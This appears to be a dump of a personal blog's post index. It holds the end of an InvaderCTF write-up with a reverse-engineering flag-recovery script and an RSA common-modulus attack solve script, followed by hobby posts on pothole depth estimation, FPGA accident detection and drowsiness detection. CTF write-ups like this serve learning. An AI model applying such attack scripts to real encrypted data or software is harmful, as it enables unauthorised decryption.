0x437; local_c8[42] = 0x3fc; local_c8[43] = 0x3eb; for (local_d0 = 0; local_d0 \u0026lt; 0x2c; local_d0 = local_d0 + 1) { local_d4 = 0; for (local_cc = 0; local_cc \u0026lt; 0xc; local_cc = local_cc + 1) { local_d4 = local_d4 + (int)param_1[local_cc + local_d0]; } if ((local_d4 ^ 0x7ff) != local_c8[local_d0]) { uVar3 = 0; goto LAB_00101454; } } uVar3 = 1; } else { uVar3 = 0; } } else { uVar3 = 0; } LAB_00101454: if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return uVar3; } I\u0026rsquo;m able to reverse the code, and get flag back using below code.\nimport string c8 = [0x37b,0x352,0x38c,0x39f,0x395,0x3c8,0x3bf,0x3ca,0x39a,0x38f,0x373,0x3bd,0x3b2,0x3c3,0x385,0x3b7, 0x3bd,0x37b,0x38a,0x37a,0x3bc,0x3a7,0x3a1,0x373,0x37d,0x3ab,0x3ba,0x3bb,0x3b3,0x3b6,0x3e4,0x3ef,0x3bb,0x3bd,0x3f0,0x3f0,0x3eb,0x3e9,0x3ed,0x3ba,0x3f7,0x437,0x3fc,0x3eb] FLAG = \u0026#34;InvaderCTF{\u0026#34; #remaining done = 0 for d0 in range(0x2c): d4 = 0 for cc in range(0xc - 1): d4 = d4 + ord(FLAG[cc+d0]) s = c8[done]^0x7ff FLAG+=str(chr(s-d4)) done+=1 print(FLAG) # InvaderCTF{cr4ck1ngs_b1nar1es_w1th_d3c0mp1ler5_i5_c00l} CRYPTO Common_Modulus Challange - common_modulus here is the link to downlaod the zip.\nQuick summary of RSA\nct = m**e % N\nWe have a message (the flag) encrypted with the same N\nbut with two different e. As the name suggests the solution to this problem is a common modulus attack\nThe idea of the attack is that if we know\nm**e1 % N m**e2 % N GCD(e1,e2)=1\nthen we can recover m. And e1 and e2 are two random generated primes.\nn = 11982945131022410542351081395449872615892579857707579658716659690935488669385262821057859182557738914580246000223393286594124225383866984597532935421878496300855873841201081561776719850279196185513497651311088240409358040299378330842236508619359647972763016690363235765860969655129269784424956130539800284778318098141912923725687592311652722505056107470370398021165270753993680221146964650298810348339426550121843506831513763524799788245715184019272818769688806186156054217173423142297185080827697102885478690188900539745266957938792259348667098941846582939290347898221569129727818304319228531810884419349788595299183 e1 = 1432834983003528423789566679766 e2 = 2379308237310255832902020443526 c1 = 10689309714150831372003282520258034721869267911572516423408248565049962108650099748793151534577215410589895845939174468496094911105822340567352621464826482784496348432260039948367408369277304473142781582593382249759117725426180831722441987089651228047819100128903524486005240635239107861739718852670683772477033147265282652735461836031051746173537294339800736436758373421135499142186805931851613817214123606130652548146050084102387221849254771049043101744791081688090961965211538682034166530987653637019819142642682927570692406882796783114872064728299928706994667553634162223654351719854271521012272876869577548029865 c2 = 10108112864771204039110360647151162379625435403389064742046377050800935678884417470071380911451172735126940164631419702014060618271946963698795724980506620687308126757038560340598588393457958478150419444430669593694549750182242922247396011389187919036956934428645928391159497083109718312975799586599853937652754710111738660741391329300491640624992257712646153846113376883043637423386066176238663086142253925553012932883285101598565990266200395298234059134450705194609356310121298248102541581987639348408092513592224044341173092657291900970886956196149689937412107716004555806327078173298630211025335704973121968612105 e1 = e1//2 e2 = e2//2 def solve(e1, e2, n, c1, c2): d, x, y = xgcd(e1, e2) m = (pow(c1, x, n) * pow(c2, y, n)) % n return m message_2 = solve(e1,e2,n,c1,c2) message = isqrt(message_2) from Crypto.Utils.number import long_to_bytes _ = long_to_bytes(message) print(_) # InvaderCTF{common_modulus_the_attack_name_is_common_modulus} Thanks for reading! ","date":"Aug 17, 2022","img":"https://0x4ka5h.github.io/posts/invaderctf-writeups/images/compose.png","permalink":"https://0x4ka5h.github.io/posts/invaderctf-writeups/","series":[],"tags":["Web","Reverse","pwn","Crypto","Misc"],"title":"InvaderCTF Writeups"},{"categories":null,"content":"Still learning weights ^_~ come again and check for checkpoints!\n","date":"Feb 3, 2022","img":"","permalink":"https://0x4ka5h.github.io/about/","series":null,"tags":null,"title":"About"},{"categories":[],"content":"Introduction I knew you guys can\u0026rsquo;t bear for long period for my presence with our new blogs. That\u0026rsquo;s why this time I came up with a real-time developed project which is submitted to the Government of India.\nVisit Hackathon website A hackathon was conducted overall in India. After, 3 rounds of filtering we got selected for the semi-final round based on the prototype presentation. And we cleared that round with our prototype and as a result, we were gone into the finals. It\u0026rsquo;s a hackathon called the Road Safety Hackathon conducted by the Ministry of Road Transport and Highways, Government of India.\nAs per recent studies, around 4000+ accidents (about 50% casualties) are observed due to potholes in India. However, this is only official data as per the available records. This doesn’t include the data related blaw, blaw, blaw\u0026hellip;.. Fine. fine fine\u0026hellip;\u0026hellip; Shit comes with shit only. Then why discuss it again? Already, we all know this shit of information cause we daily see accidents happen on roads due to bad infrastructure. That bad infrastructure leads us to create an application that is used for the Government of India by changing Road Infrastructure based on our stored data and vehicle driver to escape from accidents by following our commands.\nChaaa\u0026hellip;.Chaa.. why have these people made mistakes related to vehicles, roads, and safety? I\u0026rsquo;m tired of solving these mistakes. I\u0026rsquo;ll stop taking care of these problems and maybe this is the last blog about road safety, Accidents Prevention, and things that are related with vehicles also.\nRandom Reader (RR): \u0026ldquo;Author!! You always wasting our time by telling nonsense. Come to the point.\u0026rdquo;\nMe: \u0026ldquo;Damn. Seriously? Okay, stop kicking on my \u0026hellip;,no. I will start.\u0026rdquo;\nRR: \u0026ldquo;lamo\u0026hellip; Quick.\u0026rdquo;\nOur Aim Deep learning and Web-based voice alert system based on depth estimation and Hazards of the detected potholes.\nBrief Explanation of our Solution Brief Explanation of our Solution\nWe created this application in two ways:\nVehicles with Cameras and wifi connectors. These vehicles will detect potholes on road and send information to the cloud. The sent data will be categorized into levels of its hazards. If it returns medium or high risk, then the system will estimate the pothole depth using Deep learning techniques. At, the same time driver also got an alert from the system when there is a high risk with depth. Vehicles with no facilities can use their mobile phone to access our web application. After giving the destination location, our system will guide the driver in a very safe and best way to reach the destination safely. Here, also the alert will go through sound and the driver can also see maps to visualize the pothole\u0026rsquo;s distance from our current location. By alerting the driver when Potholes are ahead, we think they will care for us and take diversion or may go slowly to escape from accidents.\nWe actually use python for internal processing, so these are the required libraries.\nimport tensorflow as tf, tensorflow from tensorflow import keras import torch import cv2 import numpy import os,sys,time We have used YoLov5 for pothole detection purposes cause my personal computer can\u0026rsquo;t bear my model architecture and also it takes 3 days on the CPU. So we would love to use a predefined model. After a lot of case studies about predefined models, YoLov5 become the best match for our goal. But installing required software and libraries, we labeled them by hand on our dataset manually meaning picture by picture by drawing boxes. And we labeled potholes into 3 classes which are small, medium, and risk.\nYou know YoLov5, don\u0026rsquo;t you..? YOLOv5 is a family of object detection architectures and models pretrained on the COCO dataset, and represents Ultralytics open-source research into future vision AI methods, incorporating lessons learned and best practices evolved over thousands of hours of research and development and \u0026ldquo;goo gooooo goooo. Go and search about it online. I\u0026rsquo;m not here to teach you about YoLo\u0026rdquo;.\nSome RR: Me: \u0026ldquo;Jokes apart!.\u0026rdquo; Once the level of hazards is detected, then we have to apply some image processing techniques that are used to highlight features at the edge of our various detected potholes. We have already trained a regressive model which will predict the Approx. depth of a pothole.\nThat\u0026rsquo;s it, we have done a lot. Now we just need to send the information to cloud storage with GPS location and depth of pothole for others and the Government.\nEstimating Depth of a Pothole Previously as I have said, we detect potholes using YoLov5 which uses convolution neural networks in their model architecture. Once we initialize the camera and other setup, the model takes the input as an image from the camera and returns information about the image and detected coordinates.\nDownload model weights (trainedModel) model=torch.hub.load(\u0026#39;yolov5\u0026#39;,\u0026#39;custom\u0026#39;,path=\u0026#39;best.pt\u0026#39;,source=\u0026#39;local\u0026#39;) capturedFrame = cv2.imread(\u0026#34;RandomRoadimg.jpg\u0026#34;) result = model(capturedFrame) result.show() coordinatesList = result.xyxy[0][0] #coordinates of first detected pothole [12 50 200 300]\nNow, we need to send the detected part to the depth estimation model that was already trained with 200 epochs, 89% accuracy, and 0.02 loss error.\nYou guys may get doubts like if torch then why TensorFlow? if using TensorFlow then why use torch? One of our teammates is using torch always. When we are doing this project, we have less time so we divided our work. So he did detection and I estimate depth. I\u0026rsquo;m very feasible with TensorFlow and their related frameworks like Keras, media pipe, etc.., So we don\u0026rsquo;t have much time while we\u0026rsquo;re submitting these files. Anyways, we achieve our goal, but not in an optimistic way.\nOur depth estimation model is a regression model, as I said it\u0026rsquo;s just a simple linear regression model. I didn\u0026rsquo;t use any convolution neural networks in my model architecture. I just use Dense layers to Downsample the input image with a linear activation function.\nSome RR: \u0026ldquo;Author.! Is this a model? It\u0026rsquo;s very simple. See, again you writing blogs about your works? haha \u0026quot;\nMe: \u0026ldquo;Yeah! It\u0026rsquo;s a very simple model, but initially, I form a very big architecture with 16 convolution neural networks with 7 Max pooling and 2 Averagepooling with activation function relu for all layers and softmax for last one.\u0026rdquo; For 1 epoch only my PC takes 6 hours and the accuracy is best with 82% with a loss error of 0.4334.\nMe: That\u0026rsquo;s why after a lot of tries I just trail this simple network and Boom. It works.\nSo, Lets try our model on a video.\nDownload model (DepthEstimation) depthModel = keras.models.load_model(\u0026#34;modelforDepth.h5\u0026#34;) try: os.mkdir(\u0026#34;imgDepths\u0026#34;) except: pass def imgArray(img): image = tf.io.read_file(img) img = tf.image.decode_png(image) img = tf.image.convert_image_dtype(img, tf.float32) img = tf.image.resize(img, [128, 128]) return np.asarray(img) v = cv2.VideoCapture(\u0026#34;testImages/testing.mp4\u0026#34;) fontScale = 1 color = (0, 0, 255) thickness = 2 font = cv2.FONT_HERSHEY_SIMPLEX while True: _,img = v.read() try: result = model(img) except: continue coordinateLines=result.xyxy[0] k=0 for i in coordinateLines: try: if int(result.xyxyn[0][k][-1])\u0026gt;0: img1=img[int(i[1]):int(i[3]),int(i[0]):int(i[2])] img_ = cv2.cvtColor(img1,cv2.COLOR_BGR2GRAY) bluredImg = cv2.GaussianBlur(img_, (3,3), 4400) _,thresh = cv2.threshold(bluredImg,120,255,cv2.THRESH_BINARY)\tcv2.imwrite(\u0026#34;imgDepths/omkay.png\u0026#34;,thresh)\ttoFindDepth = imgArray(\u0026#34;imgDepths/omkay.png\u0026#34;) arr = depthModel(toFindDepth) dep = arr[0][0][0][0] rect = img.copy() img = cv2.putText(img, str(float(dep))[0:3]+\u0026#34; cm\u0026#34;, (int(i[0]-5),int(i[1])-5), font, fontScale, color, thickness, cv2.LINE_AA) img = cv2.rectangle(img,(int(i[0]),int(i[1])),(int(i[2]),int(i[3])),(255,0,0),2) rect = cv2.rectangle(rect,(int(i[0]),int(i[1])),(int(i[2]),int(i[3])),(255,0,0),2) except Exception as exception: print(exception) continue k+=1 cv2.imshow(\u0026#34;img\u0026#34;,img) cv2.imshow(\u0026#34;rect\u0026#34;,rect) if cv2.waitKey(1)==27: break v.release() cv2.destroyAllWindows() Download Code at g00g1y5p4\u0026rsquo;s GitHub and follow for more soruces. Thanks for reading! ","date":"Dec 31, 2021","img":"https://0x4ka5h.github.io/posts/depthestimationofapothole/images/image0.jpg","permalink":"https://0x4ka5h.github.io/posts/depthestimationofapothole/","series":[],"tags":[],"title":"Depth Estimation of a Pothole on Roads"},{"categories":["FPGA"],"content":"Introduction Have you seen my previous post? If yes, I know you will definitely come here to see my new post.. 😌. what if your answer is No? Then you will definitely come here next time🥲.\nWhat\u0026rsquo;s new this time🙄?\u0026hellip; Vehicle Accident detection using FPGA 😮‍💨.\nEw? FPGA😦? What\u0026rsquo;s that? Field Programmable Gate Arrays (FPGAs) are semiconductor devices that are based around a matrix of configurable logic blocks (CLBs) connected via programmable interconnects. FPGAs can be reprogrammed to desired application or functionality requirements after manufacturing.FPGAs contain an array of programmable logic blocks, and a hierarchy of reconfigurable interconnects allowing blocks to be wired together.An FPGA can be used to solve any problem which is computable. This is trivially proven by the fact that FPGAs can be used to implement a soft microprocessor.\nI think its not just simple as I said. It\u0026rsquo;s easy to understand and Hard to learn😉.\nWhat actually we did in this project? We had used the DE10Nano FPGA board to program. DE10Nano FPGA Board has 2 different parts:\nFPGA\nHPS \u0026mdash; Hard Processor System with a wealth of peripherals onboard for creating some interesting applications\nThe security of the vehicles can be achieved by using two methods on road and the other one is off road. On road means providing security from the accidents..So We are decided to Save lives from accidents. We are using ADXL sensor means Accelometer aka GyroScope, Magentometer to determine the vehicle position on the ground.\nHave you think that this idea is already developed in CHITRALAHARI(Telugu) movie 😒🤫? Whatever, but we dont take this idea from any movie. No means no🙄, we dont take it from there🥲, Haha\u0026hellip;\nLets dive into the project development and let me explain the basics code for this system. It has developed using python, C, Embedded-C, Java the development of android application has done using eclipse and this overall implementation can run based on IOT.\nHuh.. number of languagues🤔..Do we really need 4-5 languages or am I making some show off 😢? Ofcourse, Yes. Yes🙄? show off😅? No. Not for show off. In HPS, If we want to access accelometer we have to access via protocols using some code. So thats why I\u0026rsquo;m using C language to access.\nIncluding required libraries and Define paths for i2c protocol event file to access ADXL sensor. #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;error.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026#34;linux/input.h\u0026#34; #define INPUT_DEV_NODE \u0026#34;/dev/input/by-path/platform-ffc04000.i2c-event\u0026#34; #define SYSFS_DEVICE_DIR \u0026#34;/sys/devices/platform/soc/ffc04000.i2c/i2c-0/0-0053/\u0026#34; #define EV_CODE_X (0) #define EV_CODE_Y (1) #define EV_CODE_Z (2) #define LOOP_COUNT (1000) Let me define a function to overwrite the files data to access ADXL Initially the ADXL sensor is disabled. So we need to overwrite the data and enable the ADXL.\nvoid write_sysfs_cntl_file(const char *dir_name, const char *file_name, const char *write_str) { char path[PATH_MAX]; int path_length; int file_fd; int result; // create the path to the file we need to open path_length = snprintf(path, PATH_MAX, \u0026#34;%s/%s\u0026#34;,\tdir_name, file_name); if(path_length \u0026lt; 0) error(1, 0, \u0026#34;path output error\u0026#34;); if(path_length \u0026gt;= PATH_MAX) error(1, 0, \u0026#34;path length overflow\u0026#34;); // open the file file_fd = open(path, O_WRONLY | O_SYNC); if(file_fd \u0026lt; 0) error(1, errno, \u0026#34;could not open file \u0026#39;%s\u0026#39;\u0026#34;, path); // write the string to the file result = write(file_fd, write_str, strlen(write_str)); if(result \u0026lt; 0) error(1, errno, \u0026#34;writing to \u0026#39;%s\u0026#39;\u0026#34;, path); if((size_t)(result) != strlen(write_str)) error(1, errno, \u0026#34;buffer underflow writing \u0026#39;%s\u0026#39;\u0026#34;, path); // close the file result = close(file_fd); if(result \u0026lt; 0) error(1, errno, \u0026#34;could not close file \u0026#39;%s\u0026#39;\u0026#34;, path); } Enable and Access ADXL sensor We can enable adxl sensor in de10nano by writing \u0026ldquo;0\u0026rdquo; in /sys/devices/platform/soc/ffc04000.i2c/i2c-0/0-0053/disable file\n// enable adxl write_sysfs_cntl_file(SYSFS_DEVICE_DIR, \u0026#34;disable\u0026#34;, \u0026#34;0\u0026#34;); // set the sample rate to maximum write_sysfs_cntl_file(SYSFS_DEVICE_DIR, \u0026#34;rate\u0026#34;, \u0026#34;15\u0026#34;); // do not auto sleep write_sysfs_cntl_file(SYSFS_DEVICE_DIR, \u0026#34;autosleep\u0026#34;, \u0026#34;0\u0026#34;); // open the event device node event_dev_fd = open(input_dev_node, O_RDONLY | O_SYNC); So we enabled the ADXL sensor and already opened the device to get input values from ADXL sensor.\nif(event_dev_fd \u0026lt; 0) error(1, errno, \u0026#34;could not open file \u0026#39;%s\u0026#39;\u0026#34;, input_dev_node); // read the current state of each axis printf(\u0026#34;\\n\u0026#34;); for(i = 0 ; i \u0026lt; 3 ; i++ ) { result = ioctl (event_dev_fd, EVIOCGABS(i), \u0026amp;the_absinfo); if(result \u0026lt; 0) error(1, errno, \u0026#34;ioctl from \u0026#39;%s\u0026#39;\u0026#34;, input_dev_node); } fflush(stdout); result = read(event_dev_fd, \u0026amp;the_event, sizeof(struct input_event)); if(result \u0026lt; 0) error(1, errno, \u0026#34;reading %d from \u0026#39;%s\u0026#39;\u0026#34;, sizeof(struct input_event), input_dev_node); if(result != sizeof(struct input_event)) error(1, 0, \u0026#34;did not read %d bytes from \u0026#39;%s\u0026#39;\u0026#34;, sizeof(struct input_event), input_dev_node); // read the current state of each axis for(i = 0 ; i \u0026lt; 3 ; i++ ) { result = ioctl (event_dev_fd, EVIOCGABS(i), \u0026amp;the_absinfo); if(result \u0026lt; 0) error(1, errno, \u0026#34;ioctl from \u0026#39;%s\u0026#39;\u0026#34;, input_dev_node); abs_value_array[i] = the_absinfo.value; } printf(\u0026#34;%d %d %d\u0026#34;,abs_value_array[0],abs_value_array[1],abs_value_array[2]) Let me explain the above code, otherwise its looks like I copied from some source🤧.\nI forgot to say that What is ADXL sensor and what it will return as output? Yeah, yeah We use ADXL sensor aka GyroScope in mobile phones also. I think that pubG also uses the Gyroscope and detect if players got accident😂. I am right amn\u0026rsquo;t I🥱?\nJokes apart. GryoScope is a device used for measuring or maintaining orientation and angular velocity. It is a spinning wheel or disc in which the axis of rotation (spin axis) is free to assume any orientation by itself. So if we want to determine a position in a 3rd space we actually want x,y,z coordinates. Like this way ADXL sensor also return x,y,z coordinates of a device. Those x,y,z coordinates are printed at last of the above code which are taken from device\u0026rsquo;s triggered event.\nSo\u0026hellip;! So what? I think now you guys also do this project. What🤯? Did you detect any accident? No. Then How can you finish this blog here?\u0026hellip; What you guys are thinking is right, but I have explained you everything. Looks like I\u0026rsquo;m crazy, amn\u0026rsquo;t I? Ofcourse, may be I\u0026rsquo;m😉.\nOk Let me explain in details how I finised, Dont worry..😌!\nAccident detection using ADXL Sensor values If you run a loop infinitely, what happens? what happens\u0026hellip; system got stucked..😅. ussh🤫 Dont make jokes.. if we run a loop inifnitely, then we can calculate the difference between the values of coordinates in two consecutive seconds crosses threshhold of a normal vehicle position, then I considered it as an accident. But how? how means \u0026hellip; the sudden changes in coordinates represent sudden movement compare to its normal speed. So If a sudden change in coordinate then I thought some collision is occured.\nint main(void) { int event_dev_fd; const char *input_dev_node = INPUT_DEV_NODE; int result; int i; int loop; struct input_event the_event; struct input_absinfo the_absinfo; int abs_value_array[3] = {0}; int last_value_x=0; int last_value_y=0; int last_value_z=0; int x_abs_value_array=0; int y_abs_value_array=0; int z_abs_value_array=0; int check=1; system(\u0026#34;chmod 777 /sys/class/gpio/export\u0026#34;); system(\u0026#34;echo 107 \u0026gt; /sys/class/gpio/export\u0026#34;); system(\u0026#34;echo out \u0026gt; /sys/class/gpio/gpio107/direction\u0026#34;); system(\u0026#34;echo 1 \u0026gt; /sys/class/gpio/gpio107/value\u0026#34;); // enable adxl write_sysfs_cntl_file(SYSFS_DEVICE_DIR, \u0026#34;disable\u0026#34;, \u0026#34;0\u0026#34;); // set the sample rate to maximum write_sysfs_cntl_file(SYSFS_DEVICE_DIR, \u0026#34;rate\u0026#34;, \u0026#34;15\u0026#34;); // do not auto sleep write_sysfs_cntl_file(SYSFS_DEVICE_DIR, \u0026#34;autosleep\u0026#34;, \u0026#34;0\u0026#34;); // open the event device node event_dev_fd = open(input_dev_node, O_RDONLY | O_SYNC); if(event_dev_fd \u0026lt; 0) error(1, errno, \u0026#34;could not open file \u0026#39;%s\u0026#39;\u0026#34;, input_dev_node); // read the current state of each axis printf(\u0026#34;\\n\u0026#34;); for(i = 0 ; i \u0026lt; 3 ; i++ ) { result = ioctl (event_dev_fd, EVIOCGABS(i), \u0026amp;the_absinfo); if(result \u0026lt; 0) error(1, errno, \u0026#34;ioctl from \u0026#39;%s\u0026#39;\u0026#34;, input_dev_node); } fflush(stdout); // read the next LOOP_COUNT events for(loop = 0 ;; loop++) { // read the next event result = read(event_dev_fd, \u0026amp;the_event, sizeof(struct input_event)); if(result \u0026lt; 0) error(1, errno, \u0026#34;reading %d from \u0026#39;%s\u0026#39;\u0026#34;, sizeof(struct input_event), input_dev_node); if(result != sizeof(struct input_event)) error(1, 0, \u0026#34;did not read %d bytes from \u0026#39;%s\u0026#39;\u0026#34;, sizeof(struct input_event), input_dev_node); // read the current state of each axis for(i = 0 ; i \u0026lt; 3 ; i++ ) { result = ioctl (event_dev_fd, EVIOCGABS(i), \u0026amp;the_absinfo); if(result \u0026lt; 0) error(1, errno, \u0026#34;ioctl from \u0026#39;%s\u0026#39;\u0026#34;, input_dev_node); abs_value_array[i] = the_absinfo.value; } if (last_value_x!=0 || last_value_y!=0 || last_value_y!=0){ if (((abs(abs_value_array[0]-last_value_x))\u0026gt;200 || (abs(abs_value_array[1]-last_value_y))\u0026gt;200) \u0026amp;\u0026amp; ((abs(abs_value_array[0]-last_value_x))\u0026gt;200 || (abs(abs_value_array[2]-last_value_z))\u0026gt;200) \u0026amp;\u0026amp; ((abs(abs_value_array[1]-last_value_y))\u0026gt;200 || (abs(abs_value_array[2]-last_value_z))\u0026gt;200)){ printf(\u0026#34;%d\\n\u0026#34;,abs(abs_value_array[0]-last_value_x)); printf(\u0026#34;%d\\n\u0026#34;,abs(abs_value_array[1]-last_value_y)); printf(\u0026#34;%d\\n\u0026#34;,abs(abs_value_array[2]-last_value_z)); printf(\u0026#34; -- %d,%d,%d ----- \\n\u0026#34;, abs_value_array[0], abs_value_array[1], abs_value_array[2] ); system(\u0026#34;echo 0 \u0026gt; /sys/class/gpio/gpio107/value\u0026#34;); printf(\u0026#34; ------------ accident occurs ----------\\n\u0026#34;); break; } if((abs(abs_value_array[0]-last_value_x))\u0026gt;300 || (abs(abs_value_array[1]-last_value_y))\u0026gt;300 || (abs(abs_value_array[2]-last_value_z))\u0026gt;300){ printf(\u0026#34;%d\\n\u0026#34;,abs(abs_value_array[0]-last_value_x)); printf(\u0026#34;%d\\n\u0026#34;,abs(abs_value_array[1]-last_value_y)); printf(\u0026#34;%d\\n\u0026#34;,abs(abs_value_array[2]-last_value_z)); printf(\u0026#34; ------------- %d,%d,%d ----------------- \\n\u0026#34;, abs_value_array[0], abs_value_array[1], abs_value_array[2] ); system(\u0026#34;echo 0 \u0026gt; /sys/class/gpio/gpio107/value\u0026#34;); printf(\u0026#34; ------------ accident occurs ----------\\n\u0026#34;); break; } } if (check%50==0){ last_value_x = abs_value_array[0]; last_value_y = abs_value_array[1]; last_value_z = abs_value_array[2]; printf(\u0026#34;%d,%d,%d ----------------- \\n\u0026#34;, abs_value_array[0], abs_value_array[1], abs_value_array[2] ); check++; } if (x_abs_value_array!=abs_value_array[0] \u0026amp;\u0026amp; y_abs_value_array!=abs_value_array[1] \u0026amp;\u0026amp; z_abs_value_array!=abs_value_array[2] ){ check++; printf(\u0026#34;%d,%d,%d --- %d\\n\u0026#34;, abs_value_array[0], abs_value_array[1], abs_value_array[2], check); } x_abs_value_array = abs_value_array[0]; y_abs_value_array = abs_value_array[1]; z_abs_value_array = abs_value_array[2]; } result = close(event_dev_fd); if(result \u0026lt; 0) error(1, errno, \u0026#34;could not close file \u0026#39;%s\u0026#39;\u0026#34;, input_dev_node); // disable adxl write_sysfs_cntl_file(SYSFS_DEVICE_DIR, \u0026#34;disable\u0026#34;, \u0026#34;1\u0026#34;); } watch.c In the above code, I power up the 107th gpio pin in DE10Nano when collision occured. Yooo We did it..! What😵? .. You just did accident detection, but how others can notice that accident has been happend to thier vehicle? Author is irritating bro😖 huhh?\nOooov oov O.. I just forget. Dont tease me bro😕,I will explain. NodeMCU I have connected the 107th gpio output wire to NodeMCU to take input. So when the 107th gpio pin is powered up, then the NodeMCU read the it and sends the data to CLOUD.\n#include \u0026lt;ESP8266WiFi.h\u0026gt; #include \u0026lt;WiFiClient.h\u0026gt; #include \u0026lt;ESP8266WebServer.h\u0026gt; #include \u0026#34;Adafruit_MQTT.h\u0026#34; #include \u0026#34;Adafruit_MQTT_Client.h\u0026#34; #define AIO_SERVER \u0026#34;io.adafruit.com\u0026#34; #define AIO_SERVERPORT 1883 #define AIO_USERNAME \u0026#34;g00g1y5p4\u0026#34; #define AIO_KEY \u0026#34;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34; // Obtained from account info on io.adafruit.com int i=0; int s=0; int k=0; int n=0; /* Set these to your desired credentials. */ const char *ssid = \u0026#34;SSID\u0026#34;; //Enter your WIFI ss const char *password = \u0026#34;PASSWD\u0026#34;; //Enter your WIFI password ESP8266WebServer server(80); void handleRoot() { server.send(200, \u0026#34;text/html\u0026#34;, \u0026#34;\u0026#34;); } void handleSave() { if (server.arg(\u0026#34;pass\u0026#34;) != \u0026#34;\u0026#34;) { Serial.println(server.arg(\u0026#34;pass\u0026#34;)); } } WiFiClient client; // Setup the MQTT client class by passing in the WiFi client and MQTT server and login details. Adafruit_MQTT_Client mqtt(\u0026amp;client, AIO_SERVER, AIO_SERVERPORT, AIO_USERNAME, AIO_KEY); Adafruit_MQTT_Publish Attendance = Adafruit_MQTT_Publish(\u0026amp;mqtt, AIO_USERNAME \u0026#34;/feeds/iot\u0026#34;); void setup() { pinMode(LED_BUILTIN, OUTPUT); delay(3000); Serial.begin(115200); pinMode(0, INPUT_PULLUP); WiFi.begin(ssid, password); while (WiFi.status() != WL_CONNECTED) { delay(500); Serial.print(\u0026#34;.\u0026#34;); } pinMode(4, INPUT); server.on(\u0026#34;/Python\u0026#34;, handleRoot); server.on (\u0026#34;/save\u0026#34;, handleSave); server.begin(); connect(); } void connect() { Serial.print(F(\u0026#34;Connecting to Adafruit IO... \u0026#34;)); int8_t ret; while ((ret = mqtt.connect()) != 0) { switch (ret) { case 1: Serial.println(F(\u0026#34;Wrong protocol\u0026#34;)); break; case 2: Serial.println(F(\u0026#34;ID rejected\u0026#34;)); break; case 3: Serial.println(F(\u0026#34;Server unavail\u0026#34;)); break; case 4: Serial.println(F(\u0026#34;Bad user/pass\u0026#34;)); break; case 5: Serial.println(F(\u0026#34;Not authed\u0026#34;)); break; case 6: Serial.println(F(\u0026#34;Failed to subscribe\u0026#34;)); break; default: Serial.println(F(\u0026#34;Connection failed\u0026#34;)); break; } if(ret \u0026gt;= 0) mqtt.disconnect(); Serial.println(F(\u0026#34;Retrying connection...\u0026#34;)); delay(5000); } Serial.println(F(\u0026#34;Adafruit IO Connected!\u0026#34;)); if (! Attendance.publish(\u0026#34;g00g1y\u0026#34;)){ Serial.println(F(\u0026#34;Failed\u0026#34;)); } else { Serial.println(F(\u0026#34;Sent!\u0026#34;)); } } void loop() { server.handleClient(); if (digitalRead(0)== HIGH){ i=0; Serial.println(\u0026#34;LOW\u0026#34;); }else if(digitalRead(0)==LOW \u0026amp;\u0026amp; i==0 ){ k=0; if (s==0){ if (! Attendance.publish(\u0026#34;reset\u0026#34;)) { //Publish to Adafrui Serial.println(F(\u0026#34;Failed\u0026#34;)); } else { i+=1; Serial.println(F(\u0026#34;Sent!\u0026#34;)); } } } delay(1000); if (analogRead(4)\u0026gt;=250 \u0026amp;\u0026amp; k==0){ if (n==0){ n+=1; if (! Attendance.publish(\u0026#34;g00g1yg00g1y\u0026#34;)) { //Publish to Adafrui Serial.println(F(\u0026#34;Failed\u0026#34;)); } else { k+=1; Serial.println(F(\u0026#34;Sent!\u0026#34;)); } } }else if(analogRead(4)\u0026lt;=200 \u0026amp;\u0026amp; k!=0){ n=0; } } send_alarm.ino And I created an Android Application to request the cloud data and if the accident code is detected then the alarm will play sound continuously through that application even if we terminate the Application\u0026rsquo;s background process.\nIf accident occured\u0026hellip; Led will blink.\nVehicle-Accident-Detection-using-DE10-Nano Hope you guys like and Subscribe to this Utube account 😂😂.\nThanks for reading! ","date":"Dec 31, 2021","img":"https://0x4ka5h.github.io/posts/vehicleaccidentdetectionusingfpga/images/1.jpeg","permalink":"https://0x4ka5h.github.io/posts/vehicleaccidentdetectionusingfpga/","series":[],"tags":["DE10Nano","NodeMCU"],"title":"Vehicle Accident Detection Using FPGA"},{"categories":["Computer Vision"],"content":"Hi guys,How are you? I hope you guys are fine and missing my blogs so much.. Hah!!\nThis time I coming with a new topic mostly based on Image processing and ComputerVision technologies. Its sounds little bit different than previous blog, isn\u0026rsquo;t it? In this blog, we address a drowsy driver alert system that has been developed using such a technique in which the Video Stream Processing (VSP) is analyzed by eye blink concept through an Eye Aspect Ratio (EAR) and Euclidean distance of the eye. Face landmark algorithm is also used as a proper way to eye detection. When the driver’s fatigue is detected, the IoT module issues a warning message along with impact of collision and location information, thereby alerting with the help of a voice speaking through the Raspberry Pi monitoring system. Lets dive into the problem and discuss how this can be solve by using Image Processing techniques.First of all what we need to do in this problem is to Detect face and eyes to calculate EAR ratio of eyes. So If a face is found, we apply facial landmark detection and extract the regions.Now that we have the eye regions, so we can calculate EAR to check whether the eyes are closed or not..! Initially I didn\u0026rsquo;t get correct output until many trails and errors.\nLets start .. include required libraries import numpy as np import os,time,sys import cv2 import dlib Hah .. ! You guys may think why cv2, dlib and numpy libraries. cv2 is for computervision, dlib used to plot facial landmarks over Drivers face,numpy is used to manipulate Image arrays. Well okay.. Do we really need time library? Do we need to calculate time or something 😒.. *(-_-)*? Ofcourse, Yes. We need to calculate time difference between blink of an eye. Its sounds intresting, isn\u0026rsquo;t it? But I was irritated first time when I try to develop a algorithm to solve this program.\nRecognize Face and EYEs cap=cv2.VideoCapture(0) detector=dlib.get_frontal_face_detector() predictor=dlib.shape_predictor(\u0026#34;shape_predictor_68_face_landmarks.dat\u0026#34;) _,frame=cap.read() gray=cv2.cvtColor(frame,cv2.COLOR_BGR2GRAY) faces=detector(gray) font=cv2.FONT_HERSHEY_SIMPLEX for face in faces: x=face.left() y=face.top() h=face.right() k=face.bottom() #cv2.rectangle(gray,(x,y),(h,k),(0,255,0),1) 